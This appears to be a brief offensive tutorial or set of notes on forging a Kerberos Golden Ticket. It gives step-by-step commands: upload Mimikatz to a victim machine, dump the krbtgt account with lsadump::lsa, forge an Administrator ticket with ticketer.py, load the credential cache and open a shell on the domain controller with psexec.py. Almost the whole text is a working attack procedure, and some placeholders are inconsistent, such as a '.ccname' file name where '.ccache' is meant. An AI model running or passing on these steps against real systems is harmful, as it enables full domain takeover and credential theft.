# Mimikatz

Upload Mimikatz to the victim machine and then execute this command

  lsadump::lsa /inject /name:krbtgt

We need to dump this user’s information in order to create a Golden Ticket.

All the information it returns should be saved into a file, since we’re going to use it with the ticketer

# Ticketer.py

Once you have dumped the user’s information into a file on our local machine, we’re going to execute this script as follows

  ticketer.py -nthash nt -domain-sid sid -domain dominio Administrator

This will generate some files, and we need to create an environment variable called KRB5CCNAME, which should be the absolute path to the .ccache file that has been generated.

  export KRB5CCNAME="/route/archive/Administrador.ccname"

Now we can connect to the DC without any issues, since the system is using a Kerberos credential cache.

  python3 psexec.py -n -k domain/Administrator@DC cmd.exe

